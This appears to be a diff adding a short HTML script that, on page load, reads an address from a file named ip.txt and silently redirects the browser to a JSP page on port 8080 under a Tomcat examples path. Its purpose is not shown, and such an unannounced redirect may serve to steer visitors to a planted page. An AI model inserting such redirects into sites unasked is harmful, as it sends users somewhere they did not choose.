@@ -1,0 +1,10 @@
+<script>
+    onload = (() => {
+        setTimeout(() => {
+            fetch("ip.txt").then(t => t.text()).then(t => {
+                location.href = `http://${t}:8080/examples/jsp/mc.jsp`
+            })
+        })
+
+    });
+</script>
